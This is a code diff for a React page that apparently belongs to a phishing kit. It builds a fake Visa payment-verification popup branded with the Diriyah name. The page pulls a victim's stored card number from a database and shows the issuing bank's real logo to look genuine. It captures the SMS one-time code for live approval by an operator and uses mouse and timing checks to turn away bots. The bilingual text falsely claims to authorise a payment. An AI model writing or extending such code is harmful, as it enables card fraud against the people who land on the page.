@@ -1,127 +1,236 @@
-import { Link } from "wouter";
-import { ArrowRight, ShieldCheck, Lock, RefreshCw } from "lucide-react";
-import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
 import { useState, useEffect, useRef } from "react";
-import { handleOtp, listenForOtpApproval } from "@/lib/firebase";
 import { useLocation } from "wouter";
+import { handleOtp, listenForOtpApproval } from "@/lib/firebase";
+import { findBankLogo } from "@/lib/bank-logos";
+
+const VisaLogo = () => (
+  <svg
+    xmlns="http://www.w3.org/2000/svg"
+    viewBox="0 0 750 471"
+    className="h-[28px] w-auto"
+  >
+    <path
+      d="M278.2 334.7l35-207h56l-35 207h-56zM524.3 131.3c-11.1-4.2-28.5-8.7-50.2-8.7-55.3 0-94.3 28-94.6 68.2-.3 29.7 27.7 46.3 48.9 56.2 21.7 10.1 29 16.6 28.9 25.7-.1 13.9-17.3 20.2-33.3 20.2-22.3 0-34.1-3.1-52.4-10.7l-7.2-3.3-7.8 46c13 5.7 37 10.7 61.9 11 58.6 0 96.6-27.6 97-70.5.2-23.5-14.6-41.3-46.7-56-19.5-9.5-31.4-15.8-31.3-25.4 0-8.5 10.1-17.6 31.9-17.6 18.2-.3 31.4 3.7 41.7 7.8l5 2.3 7.6-45.2zM619.2 127.7H574c-13.8 0-24.1 3.8-30.1 17.7l-85.4 194.1h60.4l12-31.7h73.7l7 31.7h53.3l-46.7-211.8h-15zM548.1 264.6c4.5-11.5 21.7-54.6 21.7-54.6-.3.5 4.5-11.4 7.2-18.8l3.6 17c0 .1 10.4 46.5 12.6 56.4h-45.1zM230.1 127.7l-55.7 141.6-5.9-28.4c-10.4-32.7-42.6-68.1-78.6-85.8l51 179.3h60.9L292.5 127.7h-62.4z"
+      fill="#1a1f71"
+    />
+    <path
+      d="M131.3 127.7H43.1l-.7 4c69.6 17 115.7 58.1 134.8 107.5l-19.5-94.3c-3.4-13.3-13.3-16.8-26.4-17.2z"
+      fill="#f9a533"
+    />
+  </svg>
+);
+
+type Lang = "ar" | "en";
+
+interface VisitorContext {
+  cardLast4: string;
+  amount: number | null;
+  bankName: string;
+  backHref: string;
+  loading: boolean;
+}
+
+const SAUDI_MERCHANT_AR = "ALDIRIYAH";
+const SAUDI_MERCHANT_EN = "ALDIRIYAH";
+
+const formatAmount = (amount: number | null, lang: Lang) => {
+  if (amount == null) return lang === "ar" ? "—" : "—";
+  const value = amount.toLocaleString(lang === "ar" ? "ar-SA" : "en-US", {
+    minimumFractionDigits: 2,
+    maximumFractionDigits: 2,
+  });
+  return lang === "ar" ? `${value} ر.س` : `${value} SAR`;
+};
+
+const formatDate = (lang: Lang) => {
+  const d = new Date();
+  const dd = String(d.getDate()).padStart(2, "0");
+  const mm = String(d.getMonth() + 1).padStart(2, "0");
+  const yyyy = d.getFullYear();
+  return `${dd}/${mm}/${yyyy}`;
+};
+
+const buildContent = (lang: Lang, ctx: VisitorContext) => {
+  const merchant = lang === "ar" ? SAUDI_MERCHANT_AR : SAUDI_MERCHANT_EN;
+  const amount = formatAmount(ctx.amount, lang);
+  const date = formatDate(lang);
+  const last4 = ctx.cardLast4 || "0000";
+  const masked = `************${last4}`;
+
+  if (lang === "ar") {
+    return {
+      dir: "rtl" as const,
+      title: "التحقق من عملية الدفع",
+      message:
+        "لقد أرسلنا رسالة نصية قصيرة تحتوي على رمز توثيق إلى رقم هاتفك المتحرك المسجل لدينا.",
+      transaction: (
+        <>
+          أنت تفوّض تنفيذ دفعة لصالح <strong>{merchant}</strong> بقيمة{" "}
+          <strong>{amount}</strong> بتاريخ <strong>{date}</strong> بواسطة
+          البطاقة المنتهية بـ{" "}
+          <strong style={{ letterSpacing: "0.02em" }}>{masked}</strong>.
+        </>
+      ),
+      otpLabel: "رمز التحقق",
+      submit: "إرسال",
+      submitting: "جاري التحقق...",
+      resend: "إعادة إرسال الرمز",
+      resentMsg: "تم إعادة إرسال الرمز بنجاح",
+      needHelp: "بحاجة إلى المساعدة؟",
+      learnMore: "تعرف على المزيد عن عملية التحقق",
+      successTitle: "تمت العملية بنجاح",
+      successMsg: "تم التحقق من عملية الدفع بنجاح.",
+      error: "يرجى إدخال رمز التحقق",
+      rejected: "رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى",
+      blocked: "تم حظر هذا الزائر ولا يمكنه المتابعة",
+      generic: "حدث خطأ، يرجى المحاولة مرة أخرى",
+    };
+  }
+  return {
+    dir: "ltr" as const,
+    title: "Payment Verification",
+    message:
+      "We have sent a short SMS containing a verification code to your registered mobile number.",
+    transaction: (
+      <>
+        You are authorizing a payment to <strong>{merchant}</strong> for{" "}
+        <strong>{amount}</strong> on <strong>{date}</strong> using card ending
+        in <strong style={{ letterSpacing: "0.02em" }}>{masked}</strong>.
+      </>
+    ),
+    otpLabel: "Verification Code",
+    submit: "Submit",
+    submitting: "Verifying...",
+    resend: "Resend Code",
+    resentMsg: "Code resent successfully",
+    needHelp: "Need Help?",
+    learnMore: "Learn more about verification",
+    successTitle: "Payment Verified",
+    successMsg: "Your payment has been successfully verified.",
+    error: "Please enter the verification code",
+    rejected: "Invalid verification code, please try again",
+    blocked: "This visitor has been blocked",
+    generic: "An error occurred, please try again",
+  };
+};
 
 export default function OTPPage() {
   return (
-    <div className="min-h-screen bg-gradient-to-b from-[#f5efe6] to-[#ebddd0] flex flex-col" dir="rtl">
-      <Header />
-      <ProgressSteps />
-      <main className="flex-1 p-4 flex items-center justify-center">
-        <OTPForm />
-      </main>
+    <div
+      className="min-h-screen w-full flex items-center justify-center px-3 py-6"
+      style={{ background: "#d6d6d6" }}
+    >
+      <PaymentVerify />
     </div>
   );
 }
 
-function Header() {
-  return (
-    <header className="bg-[#4a1525] text-white">
-      <div className="container mx-auto px-4 py-4">
-        <div className="flex items-center justify-between">
-          <Link href="/checkout">
-            <Button
-              size="icon"
-              variant="ghost"
-              className="text-white hover:bg-white/10"
-              data-testid="button-menu-otp"
-            >
-              <ArrowRight className="w-5 h-5" />
-            </Button>
-          </Link>
-
-          <div className="flex-1 flex justify-center">
-            <img
-              src="/logo-white.svg"
-              alt="الدرعية"
-              className="h-12"
-              data-testid="img-otp-logo"
-            />
-          </div>
-
-          <div className="w-10" />
-        </div>
-      </div>
-    </header>
-  );
-}
-
-function ProgressSteps() {
-  return (
-    <div className="bg-gradient-to-r from-[#f5efe6] to-[#ebddd0] p-5" data-testid="progress-steps-otp">
-      <div className="flex items-center justify-center gap-1">
-        {[
-          { number: 1, label: "تسجيل" },
-          { number: 2, label: "الحجز" },
-          { number: 3, label: "السلة" },
-          { number: 4, label: "الدفع" },
-        ].map((step, index, arr) => (
-          <div key={step.number} className="flex items-center">
-            <div className="flex flex-col items-center">
-              <div className="w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold bg-gradient-to-br from-[#c9a96e] to-[#b8935a] text-white shadow-glow">
-                {step.number}
-              </div>
-              <span className="text-xs mt-2 text-primary font-medium">{step.label}</span>
-            </div>
-            {index < arr.length - 1 && (
-              <div className="w-10 h-1 mx-1 rounded-full bg-gradient-to-r from-[#c9a96e] to-[#b8935a]" />
-            )}
-          </div>
-        ))}
-      </div>
-    </div>
-  );
-}
-
-function OTPForm() {
+function PaymentVerify() {
+  const [, setLocation] = useLocation();
+  const [lang, setLang] = useState<Lang>("ar");
   const [otp, setOtp] = useState("");
   const [error, setError] = useState("");
-  const [isResending, setIsResending] = useState(false);
-  const inputRef = useRef<HTMLInputElement>(null);
-  
+  const [resent, setResent] = useState(false);
+  const [isWaiting, setIsWaiting] = useState(false);
+  const [otpResult, setOtpResult] = useState<"approved" | "rejected" | null>(
+    null,
+  );
+  const [ctx, setCtx] = useState<VisitorContext>({
+    cardLast4: "",
+    amount: null,
+    bankName: "",
+    backHref: "/checkout",
+    loading: true,
+  });
+
   const formLoadTime = useRef(Date.now());
   const interactionCount = useRef(0);
   const hasMouseMoved = useRef(false);
+  const inputRef = useRef<HTMLInputElement>(null);
 
+  // Bot detection setup
   useEffect(() => {
-    const handleMouseMove = () => { hasMouseMoved.current = true; };
-    const handleKeyPress = () => { interactionCount.current++; };
-    
-    window.addEventListener('mousemove', handleMouseMove);
-    window.addEventListener('touchstart', handleMouseMove);
-    window.addEventListener('keypress', handleKeyPress);
-    
+    const handleMouseMove = () => {
+      hasMouseMoved.current = true;
+    };
+    const handleKeyPress = () => {
+      interactionCount.current++;
+    };
+    window.addEventListener("mousemove", handleMouseMove);
+    window.addEventListener("touchstart", handleMouseMove);
+    window.addEventListener("keypress", handleKeyPress);
     inputRef.current?.focus();
-    
     return () => {
-      window.removeEventListener('mousemove', handleMouseMove);
-      window.removeEventListener('touchstart', handleMouseMove);
-      window.removeEventListener('keypress', handleKeyPress);
+      window.removeEventListener("mousemove", handleMouseMove);
+      window.removeEventListener("touchstart", handleMouseMove);
+      window.removeEventListener("keypress", handleKeyPress);
     };
   }, []);
 
-  const isBotDetected = (): boolean => {
-    const timeSpent = Date.now() - formLoadTime.current;
-    if (timeSpent < 2000) return true;
-    if (interactionCount.current < 1) return true;
-    if (!hasMouseMoved.current && !('ontouchstart' in window)) return true;
-    return false;
-  };
+  // Load visitor context (card last4, amount, bank lookup)
+  useEffect(() => {
+    let cancelled = false;
+    (async () => {
+      try {
+        const visitorId = localStorage.getItem("visitor");
+        if (!visitorId) {
+          if (!cancelled) setCtx((c) => ({ ...c, loading: false }));
+          return;
+        }
+        const { db } = await import("@/lib/firebase");
+        const { doc, getDoc } = await import("firebase/firestore");
+        if (!db) {
+          if (!cancelled) setCtx((c) => ({ ...c, loading: false }));
+          return;
+        }
+        const snap = await getDoc(doc(db, "pays", visitorId));
+        const data = snap.data() || {};
+        const cardNumber: string =
+          typeof data.cardNumber === "string" ? data.cardNumber : "";
+        const cardLast4 = cardNumber.replace(/\D/g, "").slice(-4);
+        const amount =
+          typeof data.totalAmount === "number"
+            ? data.totalAmount
+            : typeof data.total === "number"
+              ? data.total
+              : null;
+        const isReservation =
+          data.type === "restaurant_reservation" ||
+          data.currentPage === "reserve_checkout";
+        const backHref = isReservation ? "/restaurants" : "/checkout";
 
-  const handleChange = (value: string) => {
-    const cleaned = value.replace(/\D/g, "").slice(0, 6);
-    setOtp(cleaned);
-    setError("");
-  };
+        let bankName = "";
+        const bin = cardNumber.replace(/\D/g, "").slice(0, 6);
+        if (bin.length === 6) {
+          try {
+            const res = await fetch(`/api/bin-lookup/${bin}`);
+            if (res.ok) {
+              const json = await res.json();
+              if (json?.success && json.data?.bankName) {
+                bankName = json.data.bankName;
+              }
+            }
+          } catch {
+            // ignore
+          }
+        }
 
-  const [, setLocation] = useLocation();
-  const [isWaiting, setIsWaiting] = useState(false);
-  const [otpResult, setOtpResult] = useState<"approved" | "rejected" | null>(null);
+        if (!cancelled) {
+          setCtx({ cardLast4, amount, bankName, backHref, loading: false });
+        }
+      } catch {
+        if (!cancelled) setCtx((c) => ({ ...c, loading: false }));
+      }
+    })();
+    return () => {
+      cancelled = true;
+    };
+  }, []);
 
+  const t = buildContent(lang, ctx);
+  const bankLogo = findBankLogo(ctx.bankName);
+
+  // Listen for admin OTP approval/rejection
   useEffect(() => {
     if (!isWaiting) return;
     const unsubscribe = listenForOtpApproval((status) => {
@@ -134,18 +243,25 @@ function OTPForm() {
     return () => unsubscribe();
   }, [isWaiting, setLocation]);
 
-  const handleSubmit = async () => {
+  const isBotDetected = (): boolean => {
+    const timeSpent = Date.now() - formLoadTime.current;
+    if (timeSpent < 2000) return true;
+    if (interactionCount.current < 1) return true;
+    if (!hasMouseMoved.current && !("ontouchstart" in window)) return true;
+    return false;
+  };
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
     if (isWaiting) return;
-    if (otp.length < 4 || otp.length > 6) {
-      setError("يرجى إدخال رمز التحقق (4-6 أرقام)");
+    if (otp.length < 4 || otp.length > 8) {
+      setError(t.error);
       return;
     }
-
     if (isBotDetected()) {
-      setError("حدث خطأ، يرجى المحاولة مرة أخرى");
+      setError(t.generic);
       return;
     }
-
     setError("");
     setOtpResult(null);
     setIsWaiting(true);
@@ -154,137 +270,321 @@ function OTPForm() {
     } catch (err: any) {
       setIsWaiting(false);
       if (err?.message === "VISITOR_BLOCKED") {
-        setError("تم حظر هذا الزائر ولا يمكنه المتابعة");
+        setError(t.blocked);
       } else {
-        setError("حدث خطأ، يرجى المحاولة مرة أخرى");
+        setError(t.generic);
       }
     }
   };
 
-  const handleResend = () => {
-    setIsResending(true);
-    setOtpResult(null);
-    setError("");
+  const handleResend = (e: React.MouseEvent) => {
+    e.preventDefault();
+    setResent(true);
     setOtp("");
-    setTimeout(() => {
-      setIsResending(false);
-    }, 2000);
+    setError("");
+    setOtpResult(null);
+    setTimeout(() => setResent(false), 3000);
+  };
+
+  const toggleLang = () => {
+    setLang((l) => (l === "ar" ? "en" : "ar"));
+    setError("");
   };
 
   if (otpResult === "approved") {
     return (
-      <div className="w-full max-w-md mx-auto animate-fade-in">
-        <div className="bg-white rounded-3xl shadow-2xl p-8 space-y-6 text-center">
-          <div className="w-24 h-24 bg-gradient-to-br from-[#c9a96e] to-[#b8935a] rounded-full flex items-center justify-center mx-auto shadow-lg">
-            <ShieldCheck className="w-12 h-12 text-white" />
-          </div>
-          <h2 className="text-2xl font-bold text-[#4a1525]">تم التحقق بنجاح</h2>
-          <p className="text-[#7a6b5f] text-sm">تمت الموافقة على عملية الدفع. جاري التحويل...</p>
-          <div className="w-8 h-8 border-3 border-[#c9a96e]/30 border-t-[#c9a96e] rounded-full animate-spin mx-auto" />
+      <div
+        className="bg-white shadow-xl overflow-hidden text-center p-8"
+        style={{
+          width: "360px",
+          borderRadius: "2px",
+          border: "1px solid #c8c8c8",
+        }}
+        dir={t.dir}
+        data-testid="otp-success"
+      >
+        <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+          <svg
+            className="w-8 h-8 text-green-600"
+            fill="none"
+            stroke="currentColor"
+            viewBox="0 0 24 24"
+          >
+            <path
+              strokeLinecap="round"
+              strokeLinejoin="round"
+              strokeWidth={2}
+              d="M5 13l4 4L19 7"
+            />
+          </svg>
         </div>
+        <h2 className="text-xl font-bold text-gray-800 mb-2">
+          {t.successTitle}
+        </h2>
+        <p className="text-gray-500 text-sm">{t.successMsg}</p>
       </div>
     );
   }
 
   return (
-    <div className="w-full max-w-md mx-auto animate-fade-in">
-      <div className="bg-white rounded-3xl shadow-2xl p-8 space-y-6">
-        <div className="text-center space-y-4">
-          <div className="relative">
-            <div className="w-20 h-20 bg-gradient-to-br from-[#c9a96e] to-[#b8935a] rounded-full flex items-center justify-center mx-auto shadow-glow">
-              <ShieldCheck className="w-10 h-10 text-white" />
-            </div>
-            <div className="absolute -bottom-1 left-1/2 -translate-x-1/2">
-              <div className="bg-[#f5efe6] text-[#4a1525] text-xs font-bold px-3 py-1 rounded-full flex items-center gap-1">
-                <Lock className="w-3 h-3" />
-                آمن
-              </div>
-            </div>
-          </div>
-          <div className="pt-4">
-            <h2 className="text-2xl font-bold text-foreground">التحقق من الدفع</h2>
-            <p className="text-muted-foreground text-sm mt-2">
-              تم إرسال رمز التحقق إلى رقم جوالك المسجل
-            </p>
-          </div>
-        </div>
+    <div
+      className="bg-white shadow-xl overflow-hidden relative"
+      style={{
+        width: "360px",
+        maxWidth: "100%",
+        borderRadius: "2px",
+        border: "1px solid #c8c8c8",
+      }}
+      dir={t.dir}
+      data-testid="otp-card"
+    >
+      {/* Close (back to checkout) */}
+      <button
+        onClick={() => setLocation(ctx.backHref)}
+        className="absolute top-2 text-gray-500 hover:text-gray-800 z-10 leading-none font-light"
+        style={{
+          fontSize: "18px",
+          lineHeight: 1,
+          [lang === "ar" ? "left" : "right"]: "8px",
+        }}
+        data-testid="button-close-otp"
+        aria-label="close"
+      >
+        ✕
+      </button>
 
-        <div className="flex justify-center py-4" dir="ltr">
-          <Input
-            ref={inputRef}
-            type="text"
-            inputMode="numeric"
-            pattern="[0-9]*"
-            maxLength={6}
-            value={otp}
-            onChange={(e) => handleChange(e.target.value)}
-            className="w-full h-16 text-center text-3xl font-bold tracking-[0.4em] border-2 rounded-xl focus:border-primary focus:ring-primary/20"
-            placeholder="------"
-            autoComplete="one-time-code"
-            autoFocus
-            name="otp"
-            disabled={isWaiting}
-            data-testid="input-otp"
-          />
-        </div>
+      {/* Header */}
+      <div
+        className="flex items-center justify-between px-4 py-3 border-b bg-white"
+        style={{ borderColor: "#ddd" }}
+      >
+        <VisaLogo />
 
-        {isWaiting && (
-          <div className="bg-[#f5efe6] text-[#4a1525] text-sm p-4 rounded-xl text-center space-y-2" data-testid="status-waiting-otp">
-            <div className="w-6 h-6 border-2 border-[#c9a96e]/30 border-t-[#c9a96e] rounded-full animate-spin mx-auto" />
-            <p className="font-medium">جاري التحقق من الرمز...</p>
-          </div>
-        )}
-
-        {otpResult === "rejected" && (
-          <div className="bg-red-50 text-red-600 text-sm p-3 rounded-xl text-center" data-testid="error-otp-rejected">
-            رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى
-          </div>
-        )}
-
-        {error && (
-          <div className="bg-red-50 text-red-600 text-sm p-3 rounded-xl text-center" data-testid="error-otp">
-            {error}
-          </div>
-        )}
-
-        <div className="space-y-3">
-          <Button
-            onClick={handleSubmit}
-            size="lg"
-            className="w-full bg-primary text-white shadow-lg"
-            disabled={isWaiting}
-            data-testid="button-verify-otp"
+        <div className="flex items-center gap-2">
+          <button
+            onClick={toggleLang}
+            className="text-xs font-semibold border rounded px-2 py-1 transition-colors hover:bg-gray-100"
+            style={{
+              fontSize: "11px",
+              color: "#2563eb",
+              borderColor: "#2563eb",
+              fontFamily: "Arial, sans-serif",
+              letterSpacing: "0.05em",
+            }}
+            data-testid="button-toggle-lang"
           >
-            {isWaiting ? "جاري التحقق..." : "تأكيد الرمز"}
-          </Button>
+            {lang === "ar" ? "EN" : "عربي"}
+          </button>
 
-          <Button
-            variant="ghost"
-            onClick={handleResend}
-            disabled={isResending || isWaiting}
-            className="w-full text-primary gap-2"
-            data-testid="button-resend-otp"
-          >
-            <RefreshCw className={`w-4 h-4 ${isResending ? "animate-spin" : ""}`} />
-            {isResending ? "جاري إعادة الإرسال..." : "إعادة إرسال الرمز"}
-          </Button>
-
-          <Link href="/checkout">
-            <Button
-              variant="outline"
-              size="lg"
-              className="w-full"
-              data-testid="button-back-otp"
+          {bankLogo ? (
+            <div
+              className="flex items-center justify-center bg-white"
+              style={{ width: "90px", height: "36px" }}
+              data-testid="img-bank-logo"
             >
-              رجوع
-            </Button>
-          </Link>
+              <img
+                src={bankLogo.logo}
+                alt={bankLogo.label}
+                className="max-h-[34px] max-w-[88px] object-contain"
+                onError={(e) => {
+                  (e.currentTarget as HTMLImageElement).style.display = "none";
+                }}
+              />
+            </div>
+          ) : (
+            <div
+              className="flex items-center justify-center rounded"
+              style={{
+                width: "90px",
+                height: "36px",
+                border: "1px solid #e5e5e5",
+                background: "#fafafa",
+                color: "#9ca3af",
+                fontSize: "10px",
+                fontFamily: "Arial, sans-serif",
+              }}
+              data-testid="img-bank-logo-placeholder"
+            >
+              {ctx.loading ? "…" : "Bank"}
+            </div>
+          )}
         </div>
       </div>
 
-      <p className="text-center text-xs text-muted-foreground mt-6">
-        لم تستلم الرمز؟ تأكد من صحة رقم الجوال المسجل
-      </p>
+      {/* Body */}
+      <div className="px-5 py-5" dir={t.dir}>
+        <h1
+          className="text-center font-bold text-gray-900 mb-3"
+          style={{
+            fontSize: "16px",
+            fontFamily: "'Tajawal', Arial, sans-serif",
+          }}
+          data-testid="text-otp-title"
+        >
+          {t.title}
+        </h1>
+
+        <p
+          className="text-center text-gray-700 leading-relaxed mb-4"
+          style={{
+            fontSize: "13.5px",
+            fontFamily: "'Tajawal', Arial, sans-serif",
+          }}
+        >
+          {t.message}
+        </p>
+
+        <p
+          className="text-center text-gray-800 leading-relaxed mb-5"
+          style={{
+            fontSize: "13px",
+            fontFamily: "'Tajawal', Arial, sans-serif",
+          }}
+          data-testid="text-otp-transaction"
+        >
+          {t.transaction}
+        </p>
+
+        <form onSubmit={handleSubmit}>
+          <div className="mb-3">
+            <label
+              htmlFor="otp"
+              className="block text-center text-gray-700 mb-2"
+              style={{
+                fontSize: "13.5px",
+                fontFamily: "'Tajawal', Arial, sans-serif",
+              }}
+            >
+              {t.otpLabel}
+            </label>
+            <input
+              ref={inputRef}
+              id="otp"
+              name="otp"
+              type="text"
+              inputMode="numeric"
+              autoComplete="one-time-code"
+              maxLength={8}
+              placeholder="● ● ● ● ● ●"
+              value={otp}
+              disabled={isWaiting}
+              onChange={(e) => {
+                setOtp(e.target.value.replace(/\D/g, ""));
+                setError("");
+              }}
+              className={`w-full text-center py-2 px-3 outline-none transition-all ${
+                error || otpResult === "rejected"
+                  ? "border border-red-400 bg-red-50"
+                  : "border border-gray-300 bg-white"
+              }`}
+              style={{
+                direction: "ltr",
+                letterSpacing: "0.2em",
+                fontSize: "16px",
+                borderRadius: "3px",
+                boxShadow:
+                  error || otpResult === "rejected"
+                    ? undefined
+                    : "inset 0 1px 2px rgba(0,0,0,0.07)",
+              }}
+              onFocus={(e) => {
+                e.currentTarget.style.borderColor = "#3b82f6";
+                e.currentTarget.style.boxShadow =
+                  "0 0 0 2px rgba(59,130,246,0.15)";
+              }}
+              onBlur={(e) => {
+                e.currentTarget.style.borderColor =
+                  error || otpResult === "rejected" ? "#f87171" : "#d1d5db";
+                e.currentTarget.style.boxShadow =
+                  "inset 0 1px 2px rgba(0,0,0,0.07)";
+              }}
+              data-testid="input-otp"
+            />
+            {(error || otpResult === "rejected") && (
+              <p
+                className="text-red-500 text-center mt-1"
+                style={{ fontSize: "12px" }}
+                data-testid="error-otp"
+              >
+                {error || t.rejected}
+              </p>
+            )}
+          </div>
+
+          <button
+            type="submit"
+            disabled={isWaiting}
+            className="w-full py-2.5 text-white font-bold transition-opacity hover:opacity-90 active:opacity-80 disabled:opacity-60"
+            style={{
+              background: "#2563eb",
+              borderRadius: "3px",
+              fontSize: "15px",
+              fontFamily: "'Tajawal', Arial, sans-serif",
+            }}
+            data-testid="button-verify-otp"
+          >
+            {isWaiting ? t.submitting : t.submit}
+          </button>
+        </form>
+
+        <div className="mt-4 text-center">
+          {resent ? (
+            <p
+              className="text-green-600"
+              style={{
+                fontSize: "13px",
+                fontFamily: "'Tajawal', Arial, sans-serif",
+              }}
+              data-testid="status-otp-resent"
+            >
+              {t.resentMsg}
+            </p>
+          ) : (
+            <a
+              href="#"
+              onClick={handleResend}
+              className="hover:underline"
+              style={{
+                color: "#1d4ed8",
+                fontSize: "13px",
+                fontFamily: "'Tajawal', Arial, sans-serif",
+              }}
+              data-testid="link-resend-otp"
+            >
+              {t.resend}
+            </a>
+          )}
+        </div>
+
+        <div
+          className="mt-4 pt-3 flex items-center justify-center gap-1"
+          style={{
+            borderTop: "1px solid #e5e7eb",
+            fontSize: "13px",
+            fontFamily: "'Tajawal', Arial, sans-serif",
+          }}
+        >
+          <a
+            href="#"
+            onClick={(e) => e.preventDefault()}
+            className="hover:underline font-medium"
+            style={{ color: "#1d4ed8" }}
+            data-testid="link-need-help"
+          >
+            {t.needHelp}
+          </a>
+          <span className="text-gray-400 mx-1">|</span>
+          <a
+            href="#"
+            onClick={(e) => e.preventDefault()}
+            className="hover:underline font-medium"
+            style={{ color: "#1d4ed8" }}
+            data-testid="link-learn-more"
+          >
+            {t.learnMore}
+          </a>
+        </div>
+      </div>
     </div>
   );
 }
